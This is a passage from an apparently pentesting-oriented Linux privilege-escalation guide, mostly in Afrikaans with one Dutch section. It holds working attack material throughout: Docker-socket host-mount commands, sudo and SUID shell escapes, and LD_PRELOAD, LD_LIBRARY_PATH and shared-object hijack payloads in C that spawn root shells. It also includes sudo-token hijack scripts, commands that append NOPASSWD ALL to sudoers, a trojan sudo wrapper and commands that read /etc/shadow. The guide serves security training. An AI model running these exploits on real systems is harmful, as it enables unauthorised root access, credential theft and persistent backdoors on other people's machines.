* `Accept`: Neem 'n booleaanse argument. As dit **waar** is, word 'n **diensinstansie gegenereer vir elke inkomende verbinding** en word slegs die verbindingssocket daaraan oorgedra. As dit **onwaar** is, word al die luisterende sockets self **oorgedra aan die gestarte dienseenheid**, en slegs een dienseenheid word gegenereer vir alle verbindinge. Hierdie waarde word geïgnoreer vir datagramsockets en FIFO's waar 'n enkele dienseenheid onvoorwaardelik al die inkomende verkeer hanteer. **Standaard onwaar**. Vir prestasie-redes word dit aanbeveel om nuwe daemons slegs op 'n manier te skryf wat geskik is vir `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Neem een of meer opdraglyne, wat uitgevoer word **voor** of **na** die skep en bind van die luisterende **sockets**/FIFO's. Die eerste token van die opdraglyn moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
* `ExecStopPre`, `ExecStopPost`: Addisionele **opdragte** wat **voor** of **na** die sluit en verwyder van die luisterende **sockets**/FIFO's uitgevoer word.
* `Service`: Spesifiseer die **diens**eenheidsnaam **om te aktiveer** met **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met Accept=no. Dit is standaard die diens wat dieselfde naam as die socket dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Skryfbare .socket-lêers

As jy 'n **skryfbare** `.socket`-lêer vind, kan jy aan die begin van die `[Socket]`-afdeling iets soos `ExecStartPre=/home/kali/sys/backdoor` byvoeg en die agterdeur sal uitgevoer word voordat die socket geskep word. Jy sal dus **waarskynlik moet wag totdat die masjien herlaai word.**\
Merk op dat die stelsel daardie socketlêerkonfigurasie moet gebruik of die agterdeur sal nie uitgevoer word nie.

### Skryfbare sockets

As jy enige **skryfbare socket** identifiseer (_nou praat ons van Unix Sockets en nie van die konfigurasie `.socket`-lêers nie_), kan jy met daardie socket **kommunikeer** en dalk 'n kwesbaarheid uitbuit.

### Enumereer Unix Sockets
```bash
netstat -a -p --unix
```
### Rou verbinding

Om een ​​ruwe verbinding tot stand te brengen met een doelhost, kunt u de `nc` (netcat) opdracht gebruiken. Deze opdracht stelt u in staat om TCP- of UDP-verbindingen te maken en te beheren.

Om een ​​TCP-verbinding te maken met een doelhost op een specifieke poort, gebruikt u het volgende commando:

```bash
nc <doelhost> <poort>
```

Bijvoorbeeld:

```bash
nc 192.168.0.10 8080
```

Om een ​​UDP-verbinding te maken, voegt u de `-u` vlag toe aan het commando:

```bash
nc -u <doelhost> <poort>
```

Bijvoorbeeld:

```bash
nc -u 192.168.0.10 1234
```

Zodra de verbinding tot stand is gebracht, kunt u gegevens verzenden en ontvangen via de terminal.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitasie-voorbeeld:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP-aansluitings

Let daarop dat daar moontlik **aansluitings is wat wag vir HTTP-aanvrae** (_Ek praat nie van .socket-lêers nie, maar van die lêers wat as Unix-aansluitings optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
As die sokket **reageer met 'n HTTP** versoek, kan jy daarmee **kommunikeer** en dalk **van 'n kwesbaarheid gebruik maak**.

### Skryfbare Docker Sokket

Die Docker sokket, wat dikwels gevind word by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Standaard is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. As jy skryftoegang tot hierdie sokket het, kan dit lei tot bevoorregte eskalasie. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Bevoorregte Eskalasie met Docker CLI**

As jy skryftoegang tot die Docker sokket het, kan jy bevoorregte eskalasie bewerkstellig deur die volgende opdragte te gebruik:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte stel jou in staat om 'n houer uit te voer met toegang op roetvlak tot die gasheer se lêersisteem.

#### **Deur die Docker API Direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker sokket steeds gemanipuleer word deur die Docker API en `curl` opdragte.

1. **Lys Docker-beelde:**
Haal die lys beskikbare beelde op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Skep 'n Houer:**
Stuur 'n versoek om 'n houer te skep wat die gasheer se roetgids monteer.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Begin die nuutgeskepte houer:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Koppel aan die Houer:**
Gebruik `socat` om 'n verbinding met die houer tot stand te bring, wat opdraguitvoering binne-in die houer moontlik maak.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nadat die `socat`-verbinding opgestel is, kan jy opdragte direk in die houer uitvoer met toegang op roetvlak tot die gasheer se lêersisteem.

### Ander

Let daarop dat as jy skryftoestemmings oor die Docker sokket het omdat jy **binne die groep `docker`** is, het jy [**meer maniere om voorregte te verhoog**](interesting-groups-linux-pe/#docker-group). As die [**docker API na 'n poort luister** kan jy dit ook moontlik kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **meer maniere om uit te breek uit Docker of dit te misbruik om voorregte te verhoog** in:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) voorregverhoging

As jy vind dat jy die **`ctr`**-opdrag kan gebruik, lees dan die volgende bladsy aangesien **jy dit moontlik kan misbruik om voorregte te verhoog**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** voorregverhoging

As jy vind dat jy die **`runc`**-opdrag kan gebruik, lees dan die volgende bladsy aangesien **jy dit moontlik kan misbruik om voorregte te verhoog**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus is 'n gesofistikeerde **interproseskommunikasie (IPC)-sisteem** wat toepassings in staat stel om doeltreffend met mekaar te kommunikeer en data te deel. Dit is ontwerp met die moderne Linux-sisteem in gedagte en bied 'n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.

Die stelsel is veelsydig en ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, soortgelyk aan **verbeterde UNIX-domeinsokkets**. Dit help ook om gebeure of seine uit te saai, wat naadlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler laat demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n afgeleë objeksisteem wat diensversoeke en metode-aanroepings tussen toepassings vereenvoudig, wat prosesse wat tradisioneel ingewikkeld was, stroomlyn.

D-Bus werk volgens 'n **toelaat/weier-model** en bestuur boodskaptoestemmings (metode-oproepe, seinuitsette, ens.) gebaseer op die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleide spesifiseer interaksies met die bus en kan moontlik voorregverhoging moontlik maak deur die uitbuiting van hierdie toestemmings.

'n Voorbeeld van so 'n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf, wat toestemmings vir die root-gebruiker beskryf om boodskappe aan `fi.w1.wpa_supplicant1` te besit, te stuur en te ontvang.

Beleide sonder 'n gespesifiseerde gebruiker of groep is universeel van toepassing, terwyl "standaard" konteksbeleide van toepassing is op almal wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om 'n D-Bus kommunikasie te ondersoek en uit te buit hier:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Netwerk**

Dit is altyd interessant om die netwerk te ondersoek en die posisie van die masjien te bepaal.

### Generiese ondersoek
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Oop poorte

Kyk altyd na netwerkdienste wat op die masjien loop en waarmee jy nie voorheen kon interaksie hê nie voordat jy dit toegang gee:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Snuffel

Kyk of jy verkeer kan snuffel. As jy dit kan doen, kan jy dalk in staat wees om sekere geloofsbriewe te gryp.
```
timeout 1 tcpdump
```
## Gebruikers

### Algemene Enumerasie

Kyk **wie** jy is, watter **voorregte** het jy, watter **gebruikers** is in die stelsels, watter een kan **aanmeld** en watter een het **root-voorregte:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is geraak deur 'n fout wat gebruikers met **UID > INT\_MAX** toelaat om voorregte te verhoog. Meer inligting: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploiteer dit** met behulp van: **`systemd-run -t /bin/bash`**

### Groepe

Kyk of jy 'n **lid van 'n groep** is wat jou root-voorregte kan gee:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Knipbord

Kyk of daar iets interessants binne die knipbord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid

'n Wagwoordbeleid is 'n belangrike aspek van die beveiliging van 'n Linux-stelsel. Dit stel die vereistes en beperkings vir die skep en gebruik van wagwoorde op die stelsel. Hier is 'n paar belangrike punte om in gedagte te hou wanneer dit kom by 'n wagwoordbeleid:

- **Lengte**: Die lengte van 'n wagwoord moet voldoende lank wees om dit moeilik te maak vir aanvallers om te raai. Dit word aanbeveel dat wagwoorde ten minste 8 karakters lank moet wees.
- **Kompleksiteit**: Wagwoorde moet kompleks wees en 'n kombinasie van hoofletters, kleinletters, syfers en spesiale karakters insluit. Dit maak dit moeiliker vir aanvallers om wagwoorde te kraak deur middel van kragtige aanvalle.
- **Verandering van wagwoorde**: Dit is belangrik om gebruikers te dwing om hul wagwoorde gereeld te verander. Dit verminder die risiko van 'n aanvaller wat 'n wagwoord verkry en dit vir 'n lang tydperk gebruik.
- **Wagwoordhergebruik**: Gebruikers moet aangemoedig word om nie dieselfde wagwoord vir verskillende rekeninge te gebruik nie. Dit verminder die risiko van 'n aanvaller wat toegang tot al die rekeninge verkry as een wagwoord gekraak word.
- **Wagwoordhantering**: Gebruikers moet bewus gemaak word van die belangrikheid van die veilige hantering van hul wagwoorde. Dit sluit in om wagwoorde nie met ander te deel nie en om hulle wagwoorde veilig te stoor.

Deur 'n streng wagwoordbeleid te implementeer en gebruikers op te voed oor die belangrikheid van veilige wagwoordpraktyke, kan die risiko van wagwoordgebaseerde aanvalle op 'n Linux-stelsel verminder word.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy enige wagwoord van die omgewing **ken**, probeer om as elke gebruiker in te teken met die wagwoord.

### Su Brute

As jy nie omgee om baie geraas te maak nie en die `su` en `timeout` binêre lêers op die rekenaar teenwoordig is, kan jy probeer om gebruikers te brute-force deur [su-bruteforce](https://github.com/carlospolop/su-bruteforce) te gebruik.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare PATH-misbruik

### $PATH

As jy vind dat jy kan **skryf binne 'n sekere vouer van die $PATH**, kan jy bevoorregting verhoog deur **'n agterdeur te skep binne die skryfbare vouer** met die naam van 'n bevel wat deur 'n ander gebruiker (idealiter root) uitgevoer gaan word en wat **nie gelaai word vanaf 'n vouer wat voor jou skryfbare vouer in $PATH geleë is nie**.

### SUDO en SUID

Jy kan toegelaat word om 'n bevel uit te voer met behulp van sudo of hulle kan die suid-bit hê. Kontroleer dit deur die volgende te gebruik:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte stel jou in staat om lêers te lees en/of skryf, of selfs 'n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie mag 'n gebruiker toelaat om 'n bepaalde opdrag uit te voer met die voorregte van 'n ander gebruiker sonder om die wagwoord te weet nie.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer, dit is nou maklik om 'n skulp te kry deur 'n ssh-sleutel in die root-gids te voeg of deur `sh` te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie riglyn stel die gebruiker in staat om **'n omgewingsveranderlike in te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op die HTB-masjien Admirer**, was **kwesbaar** vir **PYTHONPATH-ontvoering** om 'n willekeurige Python-biblioteek te laai terwyl die skrip as root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo-uitvoering omzeilen via paden

**Spring** om ander lêers te lees of **symlinks** te gebruik. Byvoorbeeld in die sudoers-lêer: _hacker10 ALLES= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-opdrag/SUID-binêre sonder opdragpad

As die **sudo-toestemming** gegee word aan 'n enkele opdrag **sonder om die opdragpad te spesifiseer**: _hacker10 ALL= (root) less_, kan jy dit uitbuit deur die PATH-veranderlike te verander.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binêre lêer 'n ander opdrag uitvoer sonder om die pad daarna te spesifiseer (kontroleer altyd met **strings** die inhoud van 'n vreemde SUID binêre lêer).

[Voorbeelde van payloads om uit te voer.](payloads-to-execute.md)

### SUID binêre lêer met opdraggewys

As die **suid** binêre lêer 'n ander opdrag uitvoer deur die pad te spesifiseer, kan jy probeer om 'n **funksie uit te voer** wat dieselfde naam as die opdrag wat die suid-lêer aanroep, het.

Byvoorbeeld, as 'n suid binêre lêer _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en uit te voer:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid-binêre oproep, sal hierdie funksie uitgevoer word

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so-lêers) aan te dui wat deur die laaier voor alle ander biblioteke, insluitend die standaard C-biblioteek (`libc.so`), gelaai moet word. Hierdie proses staan bekend as die voorlaai van 'n biblioteek.

Om egter stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:

- Die laaier ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_) nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaard paaie wat ook suid/sgid is, voorafgelaai.

Privilege-escalatie kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die verklaring **env_keep+=LD_PRELOAD** insluit. Hierdie konfigurasie maak dit moontlik vir die **LD_PRELOAD** omgewingsveranderlike om volhardend te wees en erken te word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van willekeurige kode met verhoogde bevoegdhede.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompileer dit** deur die volgende te gebruik:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Uiteindelik, **verhoog voorregte** wat uitgevoer word
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
'n Soortgelyke privesc kan misbruik word as die aanvaller beheer oor die **LD\_LIBRARY\_PATH** omgewingsveranderlike het, omdat hy die pad beheer waar biblioteke gesoek gaan word.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID-binêre - .so-injeksie

Wanneer jy 'n binêre lêer met **SUID**-permissies teëkom wat ongewoon lyk, is dit 'n goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende bevel uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, wanneer jy 'n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ teëkom, dui dit op 'n potensiële moontlikheid vir uitbuiting.

Om hiervan gebruik te maak, sal jy voortgaan deur 'n C-lêer te skep, sê _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit gekompileer en uitgevoer word, streef daarna om voorregte te verhoog deur lêerregte te manipuleer en 'n skulp met verhoogde voorregte uit te voer.

Kompileer die bogenoemde C-lêer na 'n gedeelde voorwerp (.so) lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik, die uitvoering van die geaffekteerde SUID-binêre lêer moet die uitbuiting aktiveer, wat potensiële sisteem-oortreding moontlik maak.


## Gedeelde Objek Kaping
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID-binêre lêer gevind het wat 'n biblioteek laai van 'n vouer waarin ons kan skryf, laat ons die biblioteek in daardie vouer skep met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout soos die volgende kry:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Dit beteken dat die biblioteek wat jy gegenereer het 'n funksie genaamd `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n saamgestelde lys van Unix-binêre lêers wat deur 'n aanvaller uitgebuit kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy slegs argumente kan inspuit in 'n opdrag.

Die projek versamel wettige funksies van Unix-binêre lêers wat misbruik kan word om beperkte skille te deurgrond, voorregte te verhoog of te handhaaf, lêers oor te dra, bind- en omgekeerde skille te skep, en die ander naseksploitasietake te fasiliteer.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

As jy toegang het tot `sudo -l`, kan jy die instrument [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit enige sudo-reël kan uitbuit.

### Hergebruik van Sudo Tokens

In gevalle waar jy **sudo-toegang** het, maar nie die wagwoord nie, kan jy voorregte verhoog deur **te wag vir 'n sudo-opdraguitvoering en dan die sessietoken te kaap**.

Vereistes om voorregte te verhoog:

* Jy het reeds 'n skil as gebruiker "_sampleuser_"
* "_sampleuser_" het **`sudo` gebruik** om iets in die **laaste 15 minute** uit te voer (standaard is dit die duur van die sudo-token wat ons toelaat om `sudo` te gebruik sonder om enige wagwoord in te voer)
* `cat /proc/sys/kernel/yama/ptrace_scope` is 0
* `gdb` is toeganklik (jy moet dit kan oplaai)

(Jy kan `ptrace_scope` tydelik aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` in te stel)

As al hierdie vereistes voldoen word, **kan jy voorregte verhoog deur gebruik te maak van:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* Die **eerste uitbuiting** (`exploit.sh`) sal die binêre lêer `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om die sudo-token in jou sessie te **aktiveer** (jy sal nie outomaties 'n root-skil kry nie, doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Die **tweede uitbuiting** (`exploit_v2.sh`) sal 'n sh-skulp in _/tmp_ skep **wat deur root besit word met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
*Die **derde aanval** (`exploit_v3.sh`) sal 'n sudoers-lêer **skep wat sudo-tokens ewig maak en alle gebruikers toelaat om sudo te gebruik**.*
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Gebruikersnaam>

As jy **skryfregte** het in die vouer of op enige van die geskepte lêers binne die vouer, kan jy die binêre [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) gebruik om 'n sudo-token vir 'n gebruiker en PID te **skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n skulp as daardie gebruiker met PID 1234, kan jy **sudo-voorregte verkry** sonder om die wagwoord te weet deur die volgende te doen:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel in wie `sudo` kan gebruik en hoe. Hierdie lêers **kan standaard slegs deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer **kan lees**, kan jy moontlik **interessante inligting bekom**, en as jy enige lêer **kan skryf**, kan jy bevoorregtinge **verhoog**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
'n Ander manier om hierdie toestemmings te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is alternatiewe vir die `sudo` binêre lêer soos `doas` vir OpenBSD, onthou om sy konfigurasie te kontroleer by `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Oorname

As jy weet dat 'n **gebruiker gewoonlik met 'n masjien verbind en `sudo` gebruik** om voorregte te verhoog en jy het 'n skaal binne daardie gebruiker se konteks, kan jy **'n nuwe sudo uitvoerbare lêer skep** wat jou kode as root sal uitvoer en dan die gebruiker se bevel. Verander dan die $PATH van die gebruiker se konteks (byvoorbeeld deur die nuwe pad in .bash\_profile by te voeg), sodat wanneer die gebruiker sudo uitvoer, jou sudo uitvoerbare lêer uitgevoer word.

Let daarop dat as die gebruiker 'n ander skil (nie bash nie) gebruik, jy ander lêers moet wysig om die nuwe pad by te voeg. Byvoorbeeld, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan 'n ander voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Of voer iets soos die volgende uit:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaai konfigurasie lêers vandaan kom**. Gewoonlik bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasie lêers vanaf `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasie lêers **verwys na ander vouers** waar **biblioteke** gesoek sal word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel sal soek na biblioteke binne `/usr/local/lib`**.

As gevolg van **'n gebruiker wat skryftoestemmings** het op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasie lêer binne `/etc/ld.so.conf.d/*.conf`, mag hy in staat wees om voorregte te verhoog.\
Neem 'n kyk na **hoe om hierdie verkeerde konfigurasie uit te buit** op die volgende bladsy:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal die program dit gebruik op hierdie plek soos gespesifiseer in die `RPATH` veranderlike.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
